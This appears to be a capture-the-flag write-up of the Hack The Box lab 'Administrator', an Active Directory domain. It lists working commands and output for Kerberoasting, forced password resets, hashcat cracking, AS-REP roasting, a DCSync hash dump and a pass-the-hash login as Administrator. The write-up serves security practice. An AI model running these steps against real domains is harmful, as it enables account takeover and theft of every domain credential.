---
title: Administrator
layout: post
released: 2024-11-09
creators: nirza
pwned: true
tags: 
  - os/windows
  - diff/medium
category:
  - HTB
description: Administrator is running Active Directory and we're provided with initial credentials for the user Olivia. We can use Olivia to change Michael's password who can change Benjamin's Password. Benjamin is a member of Share Moderators which hints us towards file shares, nothing interesting in SMB however FTP is open and is hosting a backup passwordsafe file. Cracking this file we gain access to Emily through her password located in the file. Emily can write Ethan, however we can't Kerberoast him so instead we ASREPRoast him. Ethan has DCsync privileges over the domain so we use those to dump all the hashes
image: https://labs.hackthebox.com/storage/avatars/9d232b1558b7543c7cb85f2774687363.png
cssclass: custom_htb
---
![HTB](https://labs.hackthebox.com/storage/avatars/9d232b1558b7543c7cb85f2774687363.png)

# Information Gathering
## Enumeration
We start off not with a port scan but actually with credentials.
> As is common in real life Windows pentests, you will start the Administrator box with credentials for the following account: Username: Olivia Password: ichliebedich

`olivia`:`ichliebedich`
Now let's do our port scan.
```
PORT      STATE  SERVICE       VERSION
21/tcp    open   ftp           Microsoft ftpd
| ftp-syst:
|_  SYST: Windows_NT
53/tcp    open   domain        Simple DNS Plus
88/tcp    open   kerberos-sec  Microsoft Windows Kerberos (server time: 2025-04-14 05:59:01Z)
135/tcp   open   msrpc         Microsoft Windows RPC
139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open   ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp   open   microsoft-ds?
464/tcp   open   kpasswd5?
593/tcp   open   ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open   tcpwrapped
1852/tcp  closed virtual-time
3268/tcp  open   ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp  open   tcpwrapped
4155/tcp  closed bzr
5985/tcp  open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
6544/tcp  closed mythtv
9389/tcp  open   mc-nmf        .NET Message Framing
10231/tcp closed unknown
10637/tcp closed unknown
11493/tcp closed unknown
12879/tcp closed unknown
14359/tcp closed unknown
15108/tcp closed unknown
28070/tcp closed unknown
30243/tcp closed unknown
31277/tcp closed unknown
35185/tcp closed unknown
45026/tcp closed unknown
47001/tcp open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49340/tcp open   ncacn_http    Microsoft Windows RPC over HTTP 1.0
49344/tcp open   msrpc         Microsoft Windows RPC
49356/tcp open   msrpc         Microsoft Windows RPC
49370/tcp open   msrpc         Microsoft Windows RPC
49406/tcp open   msrpc         Microsoft Windows RPC
49664/tcp open   msrpc         Microsoft Windows RPC
49665/tcp open   msrpc         Microsoft Windows RPC
49666/tcp open   msrpc         Microsoft Windows RPC
49667/tcp open   msrpc         Microsoft Windows RPC
49669/tcp open   msrpc         Microsoft Windows RPC
52619/tcp closed unknown
53058/tcp closed unknown
60541/tcp open   msrpc         Microsoft Windows RPC
64277/tcp closed unknown
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   311:
|_    Message signing enabled and required
|_clock-skew: 7h00m00s
| smb2-time:
|   date: 2025-04-14T06:00:00
|_  start_date: N/A
```
We have a windows active directory box with all the usual ports open.
We can use the following command to sync up our current terminal's time with the box's time.
```bash
faketime "$(date +'%Y-%m-%d') $(net time -S $DC_IP | awk '{print $4}')" zsh
```
Let's start by checking where we can authenticate using the provided credentials.
```bash
nxc ldap administrator.htb -u olivia -p ichliebedich
LDAP        10.10.11.42     389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb)
LDAP        10.10.11.42     389    DC               [+] administrator.htb\olivia:ichliebedich
```
Let's grab bloodhound data.
```bash
nxc ldap administrator.htb -u olivia -p ichliebedich --bloodhound -c all --dns-server 10.10.11.42
LDAP        10.10.11.42     389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb)
LDAP        10.10.11.42     389    DC               [+] administrator.htb\olivia:ichliebedich
LDAP        10.10.11.42     389    DC               Resolved collection methods: dcom, psremote, rdp, acl, localadmin, trusts, container, group, session, objectprops
LDAP        10.10.11.42     389    DC               Done in 00M 06S
LDAP        10.10.11.42     389    DC               Compressing output into /root/.nxc/logs/DC_10.10.11.42_2025-04-14_161101_bloodhound.zip
```
Let's start up bloodhound and take a look at `Olivia`.
![](/assets/img/img_administrator/administrator-1744586215464.png)
Looks like we have transitive access towards `Benjamin` who's a `Share Moderator`.
Looking at the shares we only have read permissions over the usual shares which `Remote Managers` can access.
```bash
nxc smb administrator.htb -u olivia -p ichliebedich --shares
SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.42     445    DC               [+] administrator.htb\olivia:ichliebedich
SMB         10.10.11.42     445    DC               [*] Enumerated shares
SMB         10.10.11.42     445    DC               Share           Permissions     Remark
SMB         10.10.11.42     445    DC               -----           -----------     ------
SMB         10.10.11.42     445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.42     445    DC               C$                              Default share
SMB         10.10.11.42     445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.42     445    DC               NETLOGON        READ            Logon server share
SMB         10.10.11.42     445    DC               SYSVOL          READ            Logon server share
```
# User
Let's kerberoast `Michael`, first let's give him an `SPN`.
```bash
 bloodyAD --host 10.10.11.42 -d administrator.htb -u olivia -p 'ichliebedich' set object michael servicePrincipalName -v 'htb/w1ld'
[+] michael's servicePrincipalName has been updated
```
Now let's grab `Michael`'s TGS.
```
GetUserSPNs.py -dc-ip 10.10.11.42 'administrator.htb/olivia:ichliebedich' -request-user michael
Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies

ServicePrincipalName  Name     MemberOf                                                       PasswordLastSet             LastLogon  Delegation
--------------------  -------  -------------------------------------------------------------  --------------------------  ---------  ----------
htb/w1ld              michael  CN=Remote Management Users,CN=Builtin,DC=administrator,DC=htb  2025-04-13 23:35:38.134630  <never>



[-] CCache file is not found. Skipping...
$krb5tgs$23$*michael$ADMINISTRATOR.HTB$administrator.htb/michael*$eed52f3ea1e5b21ca81aafd9aa44be39$d6027fb021467aea8e27e1ce3f322612e2e435c2b300e4d46d3c26793203a68d60cf95f6650b36ef9b9df124c26edc87751596aabfc1418d704b45d62bc4a2c7a2a6a908d0ba5d826421005de079110633a2732e4fb0aee9b8db563f6aaa9a9ee3882
<SNIP>
```
And let's crack it with hashcat.
```
hashcat -m 13100 michael.pem `fzf-wordlists`
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-haswell-AMD Ryzen 7 5800H with Radeon Graphics, 2541/5146 MB (1024 MB allocatable), 16MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 4 MB

Dictionary cache hit:
* Filename..: /opt/lists/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

$krb5tgs$23$*michael$ADMINISTRATOR.HTB$administrator.htb/michael*$eed52f3ea1e5b21ca81aafd9aa44be39$d6027fb021467aea8e27e1ce3f322612e2e435c2b300e4d46d3c26793203a68d60cf95f6650b36ef9b9df124c26edc87751596aabfc1418d704b45d62bc4a2c7a2a6a908d0ba5d826421005de079110633a2732e4fb0aee9b8db563f6aaa9a9ee3882<SNIP>:popopopo

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*michael$ADMINISTRATOR.HTB$administrato...b0b322
Time.Started.....: Mon Apr 14 16:28:59 2025 (0 secs)
Time.Estimated...: Mon Apr 14 16:28:59 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/opt/lists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1667.4 kH/s (1.46ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 32768/14344384 (0.23%)
Rejected.........: 0/32768 (0.00%)
Restore.Point....: 24576/14344384 (0.17%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 271087 -> dyesebel

Started: Mon Apr 14 16:28:57 2025
Stopped: Mon Apr 14 16:29:01 2025
```
> [Note] I soon after learned that I actually grabbed a TGS after someone had already changed his password. In any case we can instead just change his password using the command:
> ```
> bloodyAD --host 10.10.11.42 -d administrator.htb -u olivia -p 'ichliebedich' set password michael popopopo
> [+] Password changed successfully!
> ```

We found `Michael`'s password: `popopopo`, Looking back at our bloodhound data, we know that `Michael` can forcibly change `Benjamin`'s password.
![](/assets/img/img_administrator/administrator-1744587100311.png)

So let's set his password, unfortunately not the stealthiest of approaches, but hey, what can you do.
```
bloodyAD --host 10.10.11.42 -d administrator.htb -u michael -p 'popopopo' set password benjamin P@ssword
[+] Password changed successfully!
```

I'm not a massive fan of using a changed password and suspect it will get cleaned up in a while so let's grab a TGT.

> These steps as I will soon learn aren't necessary as all I need is his password to access ftp. But it's good to keep in mind nonetheless.

```bash
getTGT.py -dc-ip "10.10.11.42" "administrator.htb"/"benjamin":"P@ssword"
Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in benjamin.ccache
```
And let's export our `KRB5CCNAME` to make it easier to access later.

```bash
export KRB5CCNAME="$(pwd)/benjamin.ccache"
```
Now remember that `Benjamin` is a Share Moderator, however I couldn't find anything interesting in SMB, what's interesting is that `ftp` port is open.
```bash
 ftp benjamin@10.10.11.42
Connected to 10.10.11.42.
220 Microsoft FTP Service
331 Password required
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||55215|)
125 Data connection already open; Transfer starting.
10-05-24  09:13AM                  952 Backup.psafe3
226 Transfer complete.
ftp>
```
We can see a `Backup.psafe3` file, looking around it looks like `psafe3` is a [Password Safe](https://pwsafe.org/) file. So let's download this.
```bash
ftp> get Backup.psafe3
local: Backup.psafe3 remote: Backup.psafe3
229 Entering Extended Passive Mode (|||55230|)
125 Data connection already open; Transfer starting.
100% |********************************************************************************************************************************************************************|   952       44.39 KiB/s    00:00 ETA
226 Transfer complete.
WARNING! 3 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
952 bytes received in 00:00 (42.08 KiB/s)
```
Let's crack it open using `hashcat`.
```bash
hashcat -m 5200 Backup.psafe3 `fzf-wordlists`
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-haswell-AMD Ryzen 7 5800H with Radeon Graphics, 2541/5146 MB (1024 MB allocatable), 16MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt
* Slow-Hash-SIMD-LOOP

ATTENTION! Potfile storage is disabled for this hash mode.
Passwords cracked during this session will NOT be stored to the potfile.
Consider using -o to save cracked passwords.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 4 MB

Dictionary cache hit:
* Filename..: /opt/lists/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

Backup.psafe3:tekieromucho

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5200 (Password Safe v3)
Hash.Target......: Backup.psafe3
Time.Started.....: Mon Apr 14 16:51:53 2025 (1 sec)
Time.Estimated...: Mon Apr 14 16:51:54 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/opt/lists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    17074 H/s (8.33ms) @ Accel:512 Loops:256 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 8192/14344384 (0.06%)
Rejected.........: 0/8192 (0.00%)
Restore.Point....: 0/14344384 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:2048-2049
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> total90

Started: Mon Apr 14 16:51:26 2025
Stopped: Mon Apr 14 16:51:55 2025
```
We get a password to open it! `tekieromucho`.
We'll need to install `Password Safe` to open this file.

![](/assets/img/img_administrator/administrator-1744588757349.png)

We see passwords for several users. If we right click we can copy the passwords.
```
alexander:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb
emma:WwANQWnmJnGV07WQN8bMS7FMAbjNur
```

Only `emily`'s password works.
```
nxc ldap administrator.htb -u users.txt -p passwords.txt --continue-on-success
LDAP        10.10.11.42     389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb)
LDAP        10.10.11.42     389    DC               [-] administrator.htb\alexander:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
LDAP        10.10.11.42     389    DC               [-] administrator.htb\emily:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
LDAP        10.10.11.42     389    DC               [-] administrator.htb\emma:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
LDAP        10.10.11.42     389    DC               [-] administrator.htb\alexander:UXLCI5iETUsIBoFVTj8yQFKoHjXmb
LDAP        10.10.11.42     389    DC               [+] administrator.htb\emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb
LDAP        10.10.11.42     389    DC               [-] administrator.htb\emma:UXLCI5iETUsIBoFVTj8yQFKoHjXmb
LDAP        10.10.11.42     389    DC               [-] administrator.htb\alexander:WwANQWnmJnGV07WQN8bMS7FMAbjNur
LDAP        10.10.11.42     389    DC               [-] administrator.htb\emma:WwANQWnmJnGV07WQN8bMS7FMAbjNur
```
We can `WinRM` into `Emily` and we have user!
```bash
 evil-winrm -i 10.10.11.42 -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'

Evil-WinRM shell v3.7

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\emily\Documents> dir
*Evil-WinRM* PS C:\Users\emily\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\emily\Desktop> dir


    Directory: C:\Users\emily\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        10/30/2024   2:23 PM           2308 Microsoft Edge.lnk
-ar---         4/11/2025   6:02 PM             34 user.txt
```
# Root
Let's take a look back at `Bloodhound` we can see that `Emily` has `GenericWrite` over `Ethan`

![](/assets/img/img_administrator/administrator-1744589371696.png)

This time, `Kerberoasting` can't be done as it violates some constraints.
```bash
bloodyAD --host 10.10.11.42 -d administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' set object Ethan servicePrincipalName -v 'htb/w1ld'
Traceback (most recent call last):
  File "/root/.local/bin/bloodyAD", line 8, in <module>
    sys.exit(main())
             ^^^^^^
  File "/root/.local/share/pipx/venvs/bloodyad/lib/python3.11/site-packages/bloodyAD/main.py", line 210, in main
    output = args.func(conn, **params)
             ^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/root/.local/share/pipx/venvs/bloodyad/lib/python3.11/site-packages/bloodyAD/cli_modules/set.py", line 26, in object
    conn.ldap.bloodymodify(
  File "/root/.local/share/pipx/venvs/bloodyad/lib/python3.11/site-packages/bloodyAD/network/ldap.py", line 301, in bloodymodify
    raise err
msldap.commons.exceptions.LDAPModifyException: LDAP Modify operation failed on DN CN=Ethan Hunt,CN=Users,DC=administrator,DC=htb! Result code: "constraintViolation" Reason: "b'000021C7: AtrErr: DSID-03200E81, #1:\n\t0: 000021C7: DSID-03200E81, problem 1005 (CONSTRAINT_ATT_TYPE), data 0, Att 90303 (servicePrincipalName)\n\x00'"
```
So instead we can do some `AS-REP` roasting by setting `DONT_REQ_PREAUTH`.
```bash
bloodyAD --host 10.10.11.42 -d administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' add uac ethan -f DONT_REQ_PREAUTH
[-] ['DONT_REQ_PREAUTH'] property flags added to ethan's userAccountControl
```
And let's grab the TGT.
```bash
GetNPUsers.py administrator.htb/emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb -request -format hashcat -outputfile ASREPRoast.txt
Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies

Name   MemberOf  PasswordLastSet             LastLogon  UAC
-----  --------  --------------------------  ---------  --------
ethan            2024-10-13 07:52:14.117811  <never>    0x410200



$krb5asrep$23$ethan@ADMINISTRATOR.HTB:ef4ed54c1df9b758bf4a6d385af88b0f$fb4eb28fab9b70d21a0fa14e8b5bad3c3847259bf77d3c57ff901d15dc7b3b3b7727c93acc1b5d69d375df00253724c310fee0f498a6d32c0cebd32c11e7ab3d0ba378c62cdc0be4531d41d0800b85c872b4357ce2670fdc3396db11240b5c51e093a1e416507ef008b0ee8061225977d
<SNIP>
```
And let's crack with hashcat.
```bash
hashcat -m 18200 ethan.pem `fzf-wordlists`
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-haswell-AMD Ryzen 7 5800H with Radeon Graphics, 2541/5146 MB (1024 MB allocatable), 16MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 4 MB

Dictionary cache hit:
* Filename..: /opt/lists/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

$krb5asrep$23$ethan@ADMINISTRATOR.HTB:ef4ed54c1df9b758bf4a6d385af88b0f$fb4eb28fab9b70d21a0fa14e8b5bad3c3847259bf77d3c57ff901d15dc7b3b3b7727c93acc1b5d69d375df00253724c310fee0f498a6d32c0cebd32c11e7ab3d0ba378c62cdc0be4531d41d0800b85c872b4357ce2670fdc3396db11240b5c51e093a1e416507ef008b0ee8061225977d<SNIP>:limpbizkit

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$ethan@ADMINISTRATOR.HTB:ef4ed54c1df9b...7e1bb1
Time.Started.....: Mon Apr 14 17:19:58 2025 (0 secs)
Time.Estimated...: Mon Apr 14 17:19:58 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/opt/lists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1832.0 kH/s (1.85ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 8192/14344384 (0.06%)
Rejected.........: 0/8192 (0.00%)
Restore.Point....: 0/14344384 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> total90

Started: Mon Apr 14 17:19:57 2025
Stopped: Mon Apr 14 17:20:00 2025
```
We get `Ethan`'s password! `limpbizkit`. Looking at bloodhound we can see that `Ethan` has `DCSync` privileges over the domain.

![](/assets/img/img_administrator/administrator-1744590215044.png)

So let's dump the secrets.
```bash
secretsdump administrator.htb/ethan:limpbizkit@10.10.11.42
Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::
administrator.htb\olivia:1108:aad3b435b51404eeaad3b435b51404ee:fbaa3e2294376dc0f5aeb6b41ffa52b7:::
administrator.htb\michael:1109:aad3b435b51404eeaad3b435b51404ee:5e6e65fb38aeb213836ce253392e00a4:::
administrator.htb\benjamin:1110:aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c:::
administrator.htb\emily:1112:aad3b435b51404eeaad3b435b51404ee:eb200a2583a88ace2983ee5caa520f31:::
administrator.htb\ethan:1113:aad3b435b51404eeaad3b435b51404ee:5c2b9f97e0620c3d307de85a93179884:::
administrator.htb\alexander:3601:aad3b435b51404eeaad3b435b51404ee:cdc9e5f3b0631aa3600e0bfec00a0199:::
administrator.htb\emma:3602:aad3b435b51404eeaad3b435b51404ee:11ecd72c969a57c34c819b41b54455c9:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:cf411ddad4807b5b4a275d31caa1d4b3:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:9d453509ca9b7bec02ea8c2161d2d340fd94bf30cc7e52cb94853a04e9e69664
Administrator:aes128-cts-hmac-sha1-96:08b0633a8dd5f1d6cbea29014caea5a2
Administrator:des-cbc-md5:403286f7cdf18385
krbtgt:aes256-cts-hmac-sha1-96:920ce354811a517c703a217ddca0175411d4a3c0880c359b2fdc1a494fb13648
krbtgt:aes128-cts-hmac-sha1-96:aadb89e07c87bcaf9c540940fab4af94
krbtgt:des-cbc-md5:2c0bc7d0250dbfc7
administrator.htb\olivia:aes256-cts-hmac-sha1-96:713f215fa5cc408ee5ba000e178f9d8ac220d68d294b077cb03aecc5f4c4e4f3
administrator.htb\olivia:aes128-cts-hmac-sha1-96:3d15ec169119d785a0ca2997f5d2aa48
administrator.htb\olivia:des-cbc-md5:bc2a4a7929c198e9
administrator.htb\michael:aes256-cts-hmac-sha1-96:26e82f378be7939066746cd6b3e257717531c828ce93bcf185fc2118024324b0
administrator.htb\michael:aes128-cts-hmac-sha1-96:dc66bbf5b40c4c4937b4ad3aceabf70f
administrator.htb\michael:des-cbc-md5:8564674620809b5d
administrator.htb\benjamin:aes256-cts-hmac-sha1-96:f60897eaaeae8e9f0c938e5cc3f18a0cecaa73fc0d9bab92e16944668c3724d5
administrator.htb\benjamin:aes128-cts-hmac-sha1-96:03aaf934b89f7e2bb61abc877f6c0dcd
administrator.htb\benjamin:des-cbc-md5:3434df9b642f4f92
administrator.htb\emily:aes256-cts-hmac-sha1-96:53063129cd0e59d79b83025fbb4cf89b975a961f996c26cdedc8c6991e92b7c4
administrator.htb\emily:aes128-cts-hmac-sha1-96:fb2a594e5ff3a289fac7a27bbb328218
administrator.htb\emily:des-cbc-md5:804343fb6e0dbc51
administrator.htb\ethan:aes256-cts-hmac-sha1-96:e8577755add681a799a8f9fbcddecc4c3a3296329512bdae2454b6641bd3270f
administrator.htb\ethan:aes128-cts-hmac-sha1-96:e67d5744a884d8b137040d9ec3c6b49f
administrator.htb\ethan:des-cbc-md5:58387aef9d6754fb
administrator.htb\alexander:aes256-cts-hmac-sha1-96:b78d0aa466f36903311913f9caa7ef9cff55a2d9f450325b2fb390fbebdb50b6
administrator.htb\alexander:aes128-cts-hmac-sha1-96:ac291386e48626f32ecfb87871cdeade
administrator.htb\alexander:des-cbc-md5:49ba9dcb6d07d0bf
administrator.htb\emma:aes256-cts-hmac-sha1-96:951a211a757b8ea8f566e5f3a7b42122727d014cb13777c7784a7d605a89ff82
administrator.htb\emma:aes128-cts-hmac-sha1-96:aa24ed627234fb9c520240ceef84cd5e
administrator.htb\emma:des-cbc-md5:3249fba89813ef5d
DC$:aes256-cts-hmac-sha1-96:98ef91c128122134296e67e713b233697cd313ae864b1f26ac1b8bc4ec1b4ccb
DC$:aes128-cts-hmac-sha1-96:7068a4761df2f6c760ad9018c8bd206d
DC$:des-cbc-md5:f483547c4325492a
[*] Cleaning up...
```
Let's `winRM` into the machine as `Administrator`.
```bash
evil-winrm -i 10.10.11.42 -u 'administrator' -H '3dc553ce4b9fd20bd016e098d2d2fd2e'

Evil-WinRM shell v3.7

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```
Just like that we have root!